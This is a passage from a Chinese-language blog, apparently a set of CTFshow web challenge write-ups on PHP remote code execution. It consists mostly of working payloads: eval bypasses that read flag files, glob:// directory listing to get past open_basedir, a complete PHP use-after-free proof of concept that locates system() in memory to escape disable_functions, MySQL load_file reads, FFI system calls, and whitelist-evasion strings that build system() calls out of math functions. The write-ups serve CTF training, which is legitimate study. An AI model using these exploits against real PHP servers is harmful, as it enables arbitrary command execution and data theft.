class="language-php">if(isset($_POST[&#39;c&#39;]))&#123;        $c&#x3D; $_POST[&#39;c&#39;];        eval($c);        $s &#x3D; ob_get_contents();        ob_end_clean();        echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__);&#125;</code></pre><p>虽然php伪协议可以读，但是结果把数字字母替换了，但是可以执行php代码让后面的匹配缓冲区不执行直接退出exit或die</p><p>Payload:</p><blockquote><p>c&#x3D;readgzfile(‘&#x2F;flag.txt’);exit(0);</p><p>c&#x3D;include(‘&#x2F;flag.txt’);exit(0);</p></blockquote><h4 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h4><p>Payload同上</p><h4 id="web72-glob协议-waf绕过"><a href="#web72-glob协议-waf绕过" class="headerlink" title="web72(glob协议+waf绕过)"></a>web72(glob协议+waf绕过)</h4><p>flag不在&#x2F;下了，但是很多查询的函数被ban了</p><p>使用glob:&#x2F;&#x2F;伪协议绕过open_basedir</p><p>glob可以遍历目录，并且不受disable_functions的限制。</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;?&gt;&lt;?php $a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;.&#x2F;*&quot;);foreach($a as $f)&#123;   echo($f-&gt;__toString().&#39; &#39;);&#125;exit(0);?&gt;</code></pre><p>仔细看看这个代码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);  # 利用DirectoryIterator($path)可以实现遍历目录下的所有文件# glob:&#x2F;&#x2F; — 查找匹配的文件路径模式# DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;)   遍历根目录里所有文件foreach($a as $f)  #循环遍历输出，并以空格为分隔&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);?&gt;</code></pre><p>其实不加前面<code>?&gt;&lt;?php</code>也是可以的。eval里的语句可以视为在当前php文件里加了几条语句，这些语句必须是完整的，即必须以<code>;</code>或者<code>?&gt;</code>结尾来结束语句，但是eval里的?&gt;不会闭合当前的php文件，所以当前php页面后续的语句都是会执行的。</p><p>可以看一下下面的图片，eval里的语句可以修改文件的变量值，但是<code>?&gt;</code>并不会闭合外面的PHP语句。<br><img src="web72.png" alt="在这里插入图片描述" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;function ctfshow($cmd) &#123; global $abc, $helper, $backtrace;class Vuln &#123;    public $a;    public function __destruct() &#123;         global $backtrace;         unset($this-&gt;a);        $backtrace &#x3D; (new Exception)-&gt;getTrace();        if(!isset($backtrace[1][&#39;args&#39;])) &#123;            $backtrace &#x3D; debug_backtrace();        &#125;    &#125;&#125;class Helper &#123;    public $a, $b, $c, $d;&#125;function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;    $address &#x3D; 0;    for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;        $address &lt;&lt;&#x3D; 8;        $address |&#x3D; ord($str[$p+$j]);    &#125;    return $address;&#125;function ptr2str($ptr, $m &#x3D; 8) &#123;    $out &#x3D; &quot;&quot;;    for ($i&#x3D;0; $i &lt; $m; $i++) &#123;        $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));        $ptr &gt;&gt;&#x3D; 8;    &#125;    return $out;&#125;function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;    $i &#x3D; 0;    for($i &#x3D; 0; $i &lt; $n; $i++) &#123;        $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));        $v &gt;&gt;&#x3D; 8;    &#125;&#125;function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;    global $abc, $helper;    write($abc, 0x68, $addr + $p - 0x10);    $leak &#x3D; strlen($helper-&gt;a);    if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;    return $leak;&#125;function parse_elf($base) &#123;    $e_type &#x3D; leak($base, 0x10, 2);    $e_phoff &#x3D; leak($base, 0x20);    $e_phentsize &#x3D; leak($base, 0x36, 2);    $e_phnum &#x3D; leak($base, 0x38, 2);    for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;        $header &#x3D; $base + $e_phoff + $i * $e_phentsize;        $p_type  &#x3D; leak($header, 0, 4);        $p_flags &#x3D; leak($header, 4, 4);        $p_vaddr &#x3D; leak($header, 0x10);        $p_memsz &#x3D; leak($header, 0x28);        if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123;             $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;            $data_size &#x3D; $p_memsz;        &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123;             $text_size &#x3D; $p_memsz;        &#125;    &#125;    if(!$data_addr || !$text_size || !$data_size)        return false;    return [$data_addr, $text_size, $data_size];&#125;function get_basic_funcs($base, $elf) &#123;    list($data_addr, $text_size, $data_size) &#x3D; $elf;    for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;        $leak &#x3D; leak($data_addr, $i * 8);        if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;            $deref &#x3D; leak($leak);                        if($deref !&#x3D; 0x746e6174736e6f63)                continue;        &#125; else continue;        $leak &#x3D; leak($data_addr, ($i + 4) * 8);        if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;            $deref &#x3D; leak($leak);                        if($deref !&#x3D; 0x786568326e6962)                continue;        &#125; else continue;        return $data_addr + $i * 8;    &#125;&#125;function get_binary_base($binary_leak) &#123;    $base &#x3D; 0;    $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;    for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;        $addr &#x3D; $start - 0x1000 * $i;        $leak &#x3D; leak($addr, 0, 7);        if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;            return $addr;        &#125;    &#125;&#125;function get_system($basic_funcs) &#123;    $addr &#x3D; $basic_funcs;    do &#123;        $f_entry &#x3D; leak($addr);        $f_name &#x3D; leak($f_entry, 0, 6);        if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;            return leak($addr + 8);        &#125;        $addr +&#x3D; 0x20;    &#125; while($f_entry !&#x3D; 0);    return false;&#125;function trigger_uaf($arg) &#123;    $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    $vuln &#x3D; new Vuln();    $vuln-&gt;a &#x3D; $arg;&#125;if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;    die(&#39;This PoC is for *nix systems only.&#39;);&#125;$n_alloc &#x3D; 10; $contiguous &#x3D; [];for($i &#x3D; 0; $i &lt; $n_alloc; $i++)    $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);trigger_uaf(&#39;x&#39;);$abc &#x3D; $backtrace[1][&#39;args&#39;][0];$helper &#x3D; new Helper;$helper-&gt;b &#x3D; function ($x) &#123; &#125;;if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;    die(&quot;UAF failed&quot;);&#125;$closure_handlers &#x3D; str2ptr($abc, 0);$php_heap &#x3D; str2ptr($abc, 0x58);$abc_addr &#x3D; $php_heap - 0xc8;write($abc, 0x60, 2);write($abc, 0x70, 6);write($abc, 0x10, $abc_addr + 0x60);write($abc, 0x18, 0xa);$closure_obj &#x3D; str2ptr($abc, 0x20);$binary_leak &#x3D; leak($closure_handlers, 8);if(!($base &#x3D; get_binary_base($binary_leak))) &#123;    die(&quot;Couldn&#39;t determine binary base address&quot;);&#125;if(!($elf &#x3D; parse_elf($base))) &#123;    die(&quot;Couldn&#39;t parse ELF header&quot;);&#125;if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;    die(&quot;Couldn&#39;t get basic_functions address&quot;);&#125;if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;    die(&quot;Couldn&#39;t get zif_system address&quot;);&#125;$fake_obj_offset &#x3D; 0xd0;for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;    write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));&#125;write($abc, 0x20, $abc_addr + $fake_obj_offset);write($abc, 0xd0 + 0x38, 1, 4); write($abc, 0xd0 + 0x68, $zif_system); ($helper-&gt;b)($cmd);exit();&#125;ctfshow(&quot;cat &#x2F;flag0.txt&quot;);ob_end_flush(); ?&gt;</code></pre><h4 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h4><p>首先查找flag位置,然后使用文件包含得到flag</p><p>Payload:</p><blockquote><p>1、c&#x3D;var_export(scandir(‘&#x2F;‘));exit(0);c&#x3D;require_once(‘&#x2F;flagc.txt’);exit(0);</p><p>2、c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob://./*");foreach($a as $f){   echo($f->__toString().' ');}exit(0);?></p><p>c&#x3D;include(‘flagc.txt’);exit(0);</p></blockquote><h4 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h4><p>scandir函数被ban了，使用DirectoryIterator类，flag在&#x2F;flagx.txt</p><p>或者使用glob协议</p><p>Payload:</p><blockquote><p>c&#x3D;var_export(glob(‘..&#x2F;..&#x2F;..’.’&#x2F;*’));exit(0);</p></blockquote><h4 id="web75-Sql-load-file"><a href="#web75-Sql-load-file" class="headerlink" title="web75(Sql load_file)"></a>web75(Sql load_file)</h4><p>可以查到flag位置：&#x2F;flag36.txt  但是include被ban了，之前的poc因为strlen被禁了获取不到system地址也没法用了</p><p>可以使用mysql的load_file函数</p><p>先查询数据库</p><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;$dsn &#x3D; &quot;mysql:host&#x3D;localhost;dbname&#x3D;information_schema&quot;;$db &#x3D; new PDO($dsn, &#39;root&#39;, &#39;root&#39;);$rs &#x3D; $db-&gt;query(&quot;select database()&quot;);## $rs &#x3D; $db-&gt;query(&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;);foreach($rs as $row)&#123;        echo($row[0]).&quot;|&quot;; &#125;exit();</code></pre><p>查到了ctftraining的数据库，然后使用load_file读取flag</p><blockquote><pre class="language-php" data-language="php"><code class="language-php">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);</code></pre></blockquote><h4 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h4><p>Payload同上</p><h4 id="web77-FFI-php7-4以上"><a href="#web77-FFI-php7-4以上" class="headerlink" title="web77(FFI php7.4以上)"></a>web77(FFI php7.4以上)</h4><p>FFI，php7.4以上才有</p><p>Payload:</p><blockquote><p>$ffi &#x3D; FFI::cdef(“int system(const char *command);”);&#x2F;&#x2F;创建一个system对象<br>$a&#x3D;’&#x2F;readflag &gt; 1.txt’;   &#x2F;&#x2F;没有回显，需要重定向到文件<br>$ffi-&gt;system($a);       &#x2F;&#x2F;通过$ffi去调用system函数</p></blockquote><h4 id="web118-Bash内置变量"><a href="#web118-Bash内置变量" class="headerlink" title="web118(Bash内置变量)"></a>web118(Bash内置变量)</h4><p><img src="web118_3.png" loading="lazy"></p><h4 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h4><p><img src="web119_3.png" loading="lazy"></p><h4 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h4><p><img src="web120.png" loading="lazy"></p><h4 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h4><p><img src="web121.png" loading="lazy"></p><h4 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h4><p><img src="web122.png" loading="lazy"></p><h4 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h4><p>2019CISCN初赛原题</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"> &lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: 收集自网络# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-06 14:04:45*&#x2F;error_reporting(0);&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#39;c&#39;]))&#123;    show_source(__FILE__);&#125;else&#123;    &#x2F;&#x2F;例子 c&#x3D;20-1    $content &#x3D; $_GET[&#39;c&#39;];    if (strlen($content) &gt;&#x3D; 80) &#123;        die(&quot;太长了不会算&quot;);    &#125;    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) &#123;        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;            die(&quot;请不要输入奇奇怪怪的字符&quot;);        &#125;    &#125;    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) &#123;        if (!in_array($func, $whitelist)) &#123;            die(&quot;请不要输入奇奇怪怪的函数&quot;);        &#125;    &#125;    &#x2F;&#x2F;帮你算出答案    eval(&#39;echo &#39;.$content.&#39;;&#39;);&#125; </code></pre><p><strong>代码审计</strong></p><p>代码接受GET传参<code>c</code>，保存在<code>content</code>中，并对参数长度进行了限制<code>&lt;80</code>。</p><p>然后设置了一个黑名单，过滤了一些特殊字符，<code>空格</code>和<code>/</code>也给过滤了，所以<code>cat /flag</code>无门。</p><p>接下来提供了一个白名单，里面是一些数学函数，并提供了一个常用数学函数的链接，可以查到这些函数的用法。</p><p>都满足以上条件后，使用<code>eval</code>来执行传入的参数。</p><p>分析到这里，只能利用白名单中提供的函数来构造命令，用到的函数有：</p><ul><li><code>base_convert()</code>：在任意进制之间转换数字</li><li><code>dechex()</code>：将十进制转换成十六进制</li><li><code>hex2bin()</code>：将十六进制转换成ascii字符</li></ul><p><strong>思路是：先利用<code>dechex()</code>将GET传入的十进制数转换成十六进制，再利用<code>hex2bin()</code>将得到的十六进制数转换成ascii字符串。又因为白名单里没有<code>hex2bin()</code>这个函数，所以需要利用<code>base_convert()</code>来将GET传入的十进制数转换成三十六进制（因为三十六进制中含有数字字母）构造出<code>hex2bin</code>，最后将分别传入的字符串拼接即可构造成功。</strong></p><p>*Trick：十进制数<code>37907361743</code>转换成三十六进制之后正好就是<code>hex2bin</code>。</p><p>因为代码中对传入的参数<code>c</code>做了长度限制，但可以通过传入其它参数，在构造出来的语句中调用即可。</p><p>这里还涉及到一个知识点，PHP中可以将函数名保存在一个变量中，然后使用这个变量来替代函数名，例如：</p><pre class="language-none"><code class="language-none">$a &#x3D; &#39;dechex&#39;;echo $a(10);&#x2F;&#x2F; a</code></pre><p>利用以上知识点，尝试构造如下payload：</p><pre class="language-none"><code class="language-none">?c&#x3D;$_GET[a]($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat &#x2F;flag</code></pre><p>构造过程如下：</p><pre class="language-none"><code class="language-none">base_convert(37907361743, 10, 36);&#x3D;&gt;hex2bindechex(1598506324);&#x3D;&gt;5f474554hex2bin(&#39;5f474554&#39;);&#x3D;&gt;_GET($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;) &#x3D;&gt; ($_GET)&#123;pi&#125;($_GET)&#123;abs&#125;  &#x2F;&#x2F;&#123;&#125;可以代替[]综上：$pi &#x3D; base_convert(37907361743, 10, 36);$pi &#x3D; $pi(dechex(1598506324));echo $pi;&#x2F;&#x2F; _GET，即此时的$pi就是_GET</code></pre><p>拼接形成payload：</p><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat%20&#x2F;flag</p></blockquote><blockquote><p>?c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi{pi}($$pi{abs})&amp;pi&#x3D;system&amp;abs&#x3D;cat flag.php</p><p>?c&#x3D;($pi&#x3D;base_convert)(22950,23,34)($pi(76478043844,9,34)(dechex(109270211257898)))</p><p>?c&#x3D;base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</p><p>?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi{0}($pi{1})&amp;0&#x3D;system&amp;1&#x3D;cat%20flag.php</p><p>$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})<br>&#x2F;&#x2F;要在请求头里面加一个  1:tac flag.php  见下图</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Rce </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
